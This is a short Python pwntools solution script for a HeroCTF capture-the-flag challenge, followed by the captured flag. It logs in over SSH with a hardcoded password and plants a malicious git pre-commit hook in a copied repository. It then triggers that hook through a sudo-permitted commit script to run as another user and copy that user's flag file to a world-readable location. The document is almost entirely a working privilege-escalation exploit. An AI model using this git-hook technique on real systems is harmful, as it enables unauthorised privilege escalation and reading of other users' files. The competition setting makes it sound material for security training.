from pwn import *

io = ssh("intern", "dyn04.heroctf.fr", port=13079, password="fairy")

exploit = """
cd /tmp
rm -rf exploit exploit.tar.gz
cp -r /app exploit
rm exploit/.git/config
ln -s /app/.git/config exploit/.git/config
cat > exploit/.git/hooks/pre-commit << 'HOOK'
#!/bin/bash
cat /home/peter/flag.txt > /tmp/flag.txt
chmod 777 /tmp/flag.txt
HOOK
chmod +x exploit/.git/hooks/pre-commit
tar -czf exploit.tar.gz exploit
echo 'fairy' | sudo -S -u peter /opt/commit.sh /tmp/exploit.tar.gz 2>&1
cat /tmp/flag.txt
"""

print(io.system(exploit).recvall().decode().strip().split("\n")[-1])

io.close()

# Hero{c4r3full_w1th_g1t_hO0k5_d4dcefb250aa8c2ffabaa57119e3bc42}
